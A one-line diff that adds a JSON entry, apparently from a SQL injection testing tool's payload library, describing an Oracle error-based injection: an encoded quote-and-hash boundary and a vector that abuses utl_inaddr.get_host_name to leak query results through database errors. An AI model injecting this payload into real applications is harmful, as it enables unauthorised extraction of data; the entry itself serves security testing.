@@ -1,0 +1,1 @@
+{"dbms": "oracle", "technique": "error", "boundary": {"prefix": "'%23", "suffix": "", "type": "single-enc-hash"}, "vector": "{B} AND 1=utl_inaddr.get_host_name(({Q}))", "comment": "oracle error: single+enc hash"}
